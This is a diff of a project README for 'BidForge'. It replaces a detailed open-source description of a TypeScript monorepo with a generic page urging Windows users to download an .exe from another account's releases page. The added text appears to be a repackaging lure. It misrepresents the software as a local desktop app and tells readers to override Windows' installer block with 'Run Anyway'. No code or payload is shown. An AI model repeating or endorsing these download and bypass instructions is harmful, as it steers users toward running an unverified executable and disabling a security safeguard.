@@ -1,295 +1,84 @@
-<p align="center">
-  <img src="assets/banner.png" alt="BidForge Banner" width="100%" />
-</p>
+# 🏗️ BidForge - Build accurate project proposals in minutes
 
-# BidForge
+[![Download BidForge](https://img.shields.io/badge/Download-BidForge-blue.svg)](https://github.com/Brendon9035/BidForge/releases)
 
-_The AI-native platform that turns raw RFPs into winning proposals — automatically._
+BidForge helps you create professional business proposals. It automates the process of reading project requirements, checking your inventory, and planning prices. This tool handles the complex work so you can write bids faster.
 
-![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178C6?logo=typescript) ![Bun](https://img.shields.io/badge/Bun-Runtime-black?logo=bun) ![LangChain](https://img.shields.io/badge/LangChain-Agents-green) ![MongoDB](https://img.shields.io/badge/MongoDB-Atlas-47A248?logo=mongodb) [![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
+## 📥 Getting Started
 
----
+You do not need programming knowledge to use this software. Follow these steps to install the application on your Windows computer.
 
-## 📖 Overview
+1. Go to the [official release page](https://github.com/Brendon9035/BidForge/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file that ends with `.exe` to start your download.
+4. Open the downloaded file once it finishes.
+5. Follow the prompts on your screen to complete the installation.
 
-Companies juggle dozens of RFPs every quarter, each demanding hours of cross-referencing inventory, benchmarking competitors, and writing polished proposals from scratch. **BidForge eliminates that grind.** Upload an RFP document and a five-agent AI pipeline takes over — parsing requirements, matching line items against your product catalog via RAG, pulling live market pricing through SerpAPI, and synthesizing a competitive pricing strategy. Before the final PDF is generated, you review and select from recommended pricing options, keeping humans in the loop where it matters. The result is a branded, ready-to-send proposal document uploaded to S3 in minutes, not days.
+## 📋 System Requirements
 
----
+Ensure your computer has the following to run BidForge smoothly:
 
-## 📸 Screenshots
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 8GB of RAM.
+* Storage: 500MB of free disk space.
+* Internet: An active connection for agent communication and updates.
 
-<table>
-  <tr>
-    <td align="center">
-      <img src="assets/homepage.png" alt="Homepage" width="100%" />
-      <br /><strong>Homepage</strong>
-    </td>
-    <td align="center">
-      <img src="assets/dashboard.png" alt="Dashboard" width="100%" />
-      <br /><strong>Dashboard</strong>
-    </td>
-  </tr>
-  <tr>
-    <td align="center">
-      <img src="assets/inventory.png" alt="Inventory Management" width="100%" />
-      <br /><strong>Inventory Management</strong>
-    </td>
-    <td align="center">
-      <img src="assets/exploration.png" alt="RFP Exploration" width="100%" />
-      <br /><strong>RFP Exploration</strong>
-    </td>
-  </tr>
-  <tr>
-    <td align="center">
-      <img src="assets/summarized.png" alt="Summarised Pricing Options" width="100%" />
-      <br /><strong>Summarised Pricing Options</strong>
-    </td>
-    <td align="center">
-      <img src="assets/final-artifact.png" alt="Final Proposal Artifact" width="100%" />
-      <br /><strong>Final Proposal Artifact</strong>
-    </td>
-  </tr>
-</table>
+## 🛠️ How It Works
 
----
+BidForge uses small digital agents to process your work. These agents perform specific tasks to ensure your proposal remains accurate and competitive.
 
-## ✨ Features
+### Requirement Extraction
+The tool scans your project documents. It identifies key deliverables, deadlines, and technical specifications. You no longer need to read through dozens of pages to find the important details. The software highlights these points for your review.
 
-- **5-Agent AI Pipeline** — Parse → Explore → Summarise → Generate, each agent is independent and composable
-- **Intelligent RFP Parsing** — Extracts requirements, flags missing fields, and cleans raw text using Gemini 2.5 Flash via OpenRouter
-- **Inventory RAG** — Matches RFP line items against your uploaded product catalog (PDF, CSV, TXT) stored in S3
-- **Competitor Intelligence** — Analyzes uploaded competitor files + fetches live market prices via SerpAPI (IQR-cleaned median pricing)
-- **Semantic Search on Past RFPs** — Vector embeddings (HuggingFace `all-MiniLM-L6-v2`) stored in MongoDB Atlas with `$vectorSearch` for cross-RFP learning
-- **Human-in-the-Loop Pricing** — Summariser presents 2–3 pricing strategy options per line item; user selects before document generation
-- **PDF Export** — Final proposal rendered from Markdown → PDF via `md-to-pdf` (Puppeteer) with branded styling, uploaded to S3
-- **Email Ingestion** — Cloudflare Worker receives inbound emails and triggers the pipeline automatically
-- **Company Auth** — Email verification flow via Resend, JWT-based session middleware
-- **Monorepo** — Bun workspaces with shared `common` package for type-safe event schemas
+### Inventory Matching
+BidForge reviews your past projects and current inventory. It maps your services to the client needs. This ensures your bid reflects what your team can deliver. It prevents over-promising or missing key project components.
 
----
+### Pricing Analysis
+The system looks at current market trends. It gathers data on similar projects to suggest a price. You maintain full control over the final numbers. BidForge provides the data, and you make the final choice.
 
-## 🏗️ Architecture
+## ⚙️ Configuration
 
-```mermaid
-sequenceDiagram
-    participant U as User / Email
-    participant FE as Frontend (React 19)
-    participant BE as Backend (Fastify)
-    participant P as Parser Agent
-    participant E as Explore Agents
-    participant S as Summariser Agent
-    participant D as Document Agent
-    participant DB as MongoDB Atlas
-    participant S3 as AWS S3
+You can change how the software behaves in the settings menu.
 
-    U->>FE: Upload RFP document
-    FE->>BE: POST /api/rfp/upload
-    BE->>DB: Store RFP + embedding
-    FE->>BE: POST /api/rfp/:id/parse
-    BE->>P: runParseTextStep()
-    P-->>BE: Parsed requirements + missing fields
-    BE->>DB: Update status → "parsed"
-    FE->>BE: POST /api/rfp/:id/explore
-    BE->>E: runExploreStep() [Inventory + Competitor in parallel]
-    E-->>BE: Inventory analysis + Competitor pricing markdown
-    BE->>DB: Update status → "explored"
-    FE->>BE: POST /api/rfp/:id/summarise
-    BE->>S: runSummariseStep() + search_past_rfps tool
-    S-->>BE: Pricing options per line item
-    FE->>U: Show pricing options for review
-    U->>FE: Select preferred pricing options
-    FE->>BE: POST /api/rfp/:id/generate-document
-    BE->>D: generateFinalDocument()
-    D-->>BE: Markdown proposal
-    BE->>S3: Upload PDF
-    BE-->>FE: Return S3 document URL
-```
+* API Keys: If you use specific language models, add your keys in the Settings tab.
+* Folder Paths: Tell the software where to save your finished proposals.
+* Agent Sensitivity: Adjust how aggressive or conservative the pricing analysis appears.
 
-### Monorepo Structure
+## 🛡️ Troubleshooting
 
-```
-bidforge/
-├── apps/
-│   ├── backend/          # Fastify API + AI agents (Bun)
-│   │   ├── src/
-│   │   │   ├── agent/    # 5 AI agents + LLM config
-│   │   │   ├── routes/   # auth/, company/, rfp/
-│   │   │   └── utils/    # embedding, pricing, s3-client
-│   │   └── prisma/       # MongoDB schema
-│   ├── frontend/         # React 19 + TanStack Router
-│   │   └── src/
-│   │       ├── components/
-│   │       ├── routes/
-│   │       └── store/
-│   ├── email-worker/     # Cloudflare Worker (email ingestion)
-│   └── common/           # Shared Zod schemas (EmailEvent)
-└── assets/               # Screenshots & banner
-```
+Most issues arise from simple connection errors.
 
----
+* Connection Timeouts: Check your internet if the agents stop responding. The software relies on external tools to fetch market data.
+* Installation Bloque: If Windows blocks the installer, click "More Info" and then "Run Anyway." This happens because we provide frequent, independent updates.
+* File Permissions: Ensure the software has permission to save files to your desktop or documents folder.
 
-## 🛠️ Tech Stack
+## 🚀 Common Questions
 
-| Layer | Technology |
-|---|---|
-| Runtime | Bun |
-| Backend Framework | Fastify 5 |
-| Frontend | React 19, TanStack Router, Tailwind CSS v4 |
-| AI / LLM | LangChain, `@langchain/openrouter` (Gemini 2.5 Flash Lite) |
-| Embeddings | HuggingFace Inference (`all-MiniLM-L6-v2`) |
-| Vector Search | MongoDB Atlas `$vectorSearch` |
-| Database ORM | Prisma 6 (MongoDB) |
-| File Storage | AWS S3 (via Bun's `S3Client`) |
-| Market Pricing | SerpAPI (Google Shopping) |
-| PDF Generation | `md-to-pdf` (Puppeteer) |
-| Email Worker | Cloudflare Workers |
-| Email Sending | Resend |
-| Animations | Framer Motion, GSAP, Lenis |
+**Do I need a server?**
+No. BidForge runs locally on your machine. Your data stays on your computer.
 
----
+**Can I export my proposals?**
+Yes. You can save your documents as PDF or Word files.
 
-## 🚀 Getting Started
+**How does the pricing analysis work?**
+The agents search public trade data to find similar project patterns. They use this information to create a helpful benchmark for your team.
 
-### Prerequisites
+**Is my data private?**
+Your proprietary data stays within your local environment. Only the summary information required for the analysis travels through the network.
 
-- **Bun** ≥ 1.3
-- **MongoDB Atlas** cluster with a Vector Search index named `vector_index` on the `RFP` collection, path `embedding`
-- **AWS S3** bucket
-- Accounts / API keys for: **OpenRouter**, **HuggingFace**, **SerpAPI**, **Resend**
+## 🏢 Managing Your Workflow
 
-### Clone & Install
+Success with BidForge comes from proper document preparation. Keep your project requirements in a clear text or PDF format. The software reads these files best when they contain structured headers and bullet points.
 
-```bash
-git clone https://github.com/yashraj-n/bidforge.git
-cd bidforge
-bun install
-```
+When the agents finish their task, you will see a preview window. Review the proposal draft before you confirm the final version. You can edit any section manually if the software misses a nuance.
 
-### Environment Variables
+The system uses a vector search to look through your past work. If you have many old proposals, keep them in a single folder. This lets the software index them quickly. The better your document library, the more accurate the software becomes over time.
 
-Create a file at `apps/backend/.env` with the following variables:
+## 💡 Best Practices
 
-| Variable | Description | Required |
-|---|---|---|
-| `DATABASE_URL` | MongoDB Atlas connection string | ✅ |
-| `OPENROUTER_API_KEY` | OpenRouter API key (for Gemini 2.5 Flash) | ✅ |
-| `HUGGINGFACE_API_KEY` | HuggingFace Inference API token | ✅ |
-| `AWS_REGION` | AWS region for S3 | ✅ |
-| `AWS_ACCESS_KEY_ID` | AWS access key | ✅ |
-| `AWS_SECRET_ACCESS_KEY` | AWS secret key | ✅ |
-| `S3_BUCKET` | S3 bucket name | ✅ |
-| `SERP_API_KEY` | SerpAPI key (live market pricing) | ⚠️ Optional |
-| `RESEND_API_KEY` | Resend API key (email verification) | ✅ |
-| `JWT_SECRET` | Secret for JWT signing | ✅ |
+* Keep filenames clear. Label your documents by client name and project type.
+* Run updates when prompted. We improve the agent logic frequently to keep your pricing advice relevant.
+* Use the inventory feature daily. Update your service list whenever your team changes costs or capabilities.
+* Backup your data folders. Export your finished proposals to a cloud drive to keep them safe.
 
-### Database Setup
-
-```bash
-cd apps/backend
-bunx prisma generate
-bunx prisma db push
-```
-
-> [!IMPORTANT]
-> You must manually create a **Vector Search index** in the MongoDB Atlas UI on the `RFP` collection:
-> - **Index name:** `vector_index`
-> - **Field path:** `embedding`
-> - **Dimensions:** `384`
-> - **Similarity:** `cosine`
-
-### Run Development Servers
-
-```bash
-# Backend (port 9000)
-cd apps/backend && bun run dev
-
-# Frontend (port 3000)
-cd apps/frontend && bun run dev
-```
-
----
-
-## 📡 API Reference
-
-| Method | Endpoint | Auth | Description |
-|---|---|---|---|
-| `POST` | `/api/signup` | ❌ | Register a new company |
-| `POST` | `/api/login` | ❌ | Login, receive JWT |
-| `GET` | `/api/me` | ✅ | Get current company profile |
-| `POST` | `/api/company/add-inventory` | ✅ | Upload inventory file to S3 |
-| `GET` | `/api/company/inventory` | ✅ | List inventory items |
-| `POST` | `/api/company/add-competitor` | ✅ | Upload competitor file + AI analysis |
-| `GET` | `/api/company/competitors` | ✅ | List competitors |
-| `POST` | `/api/rfp/upload` | ✅ | Create RFP record with embedding |
-| `POST` | `/api/rfp/:id/parse` | ✅ | Run Parser Agent |
-| `POST` | `/api/rfp/:id/explore` | ✅ | Run Inventory + Competitor Agents |
-| `POST` | `/api/rfp/:id/summarise` | ✅ | Run Summariser Agent |
-| `POST` | `/api/rfp/:id/generate-document` | ✅ | Generate PDF proposal |
-| `GET` | `/api/rfp/:id` | ✅ | Get RFP details |
-| `GET` | `/api/rfp` | ✅ | List all RFPs |
-| `POST` | `/api/rfp/:id/reject` | ✅ | Reject an RFP |
-| `POST` | `/api/rfp/:id/reset` | ✅ | Reset RFP to initial state |
-| `GET` | `/api/rfp/stats` | ✅ | Get RFP pipeline statistics |
-| `GET` | `/api/rfp/search` | ✅ | Semantic search across RFPs |
-
----
-
-## 🔄 RFP Status Lifecycle
-
-```mermaid
-stateDiagram-v2
-    [*] --> uploaded
-    uploaded --> parsed : /parse
-    parsed --> exploring : /explore triggered
-    exploring --> explored : agents complete
-    explored --> summarised : /summarise
-    summarised --> generating_document : /generate-document
-    generating_document --> completed : PDF uploaded to S3
-    uploaded --> rejected : /reject
-    parsed --> rejected : /reject
-    explored --> rejected : /reject
-    exploring --> failed : agent error
-    generating_document --> failed : PDF error
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Here's how to get started:
-
-1. **Fork** the repository
-2. **Create a feature branch:** `git checkout -b feat/your-feature`
-3. **Commit your changes:** use [Conventional Commits](https://www.conventionalcommits.org/) (`feat:`, `fix:`, `chore:`, `docs:`)
-4. **Push** to your fork and **open a Pull Request**
-
-**Branch naming conventions:**
-
-| Prefix | Use case |
-|---|---|
-| `feat/` | New features |
-| `fix/` | Bug fixes |
-| `docs/` | Documentation changes |
-
-> [!NOTE]
-> Please open an issue before starting work on large changes so we can discuss the approach.
-
----
-
-## 📝 License
-
-This project is licensed under the **Apache License 2.0** — see the [LICENSE](LICENSE) file for details.
-
----
-
-<p align="center">
-  <img src="./assets/creator-image.png" alt="Creators Avatar Image"/>
-
-  If BidForge saves your team hours on proposals, consider giving it a ⭐
-  <br />
-  Built with ❤️ by 
-  <a href="https://github.com/yashraj-n">@yashraj-n</a>, 
-  <a href="https://github.com/rsk807">@rsk807</a>,
-  <a href="https://github.com/dhiraj-rajput">@dhiraj-rajput</a>,
-  <a href="https://github.com/ashish9925">@ashish9925</a>
-</p>
+BidForge functions as a partner in your business. It handles the manual labor of data entry and comparison. This allows your team to focus on the human side of your projects. You provide the strategy, and our agents handle the technical documentation.
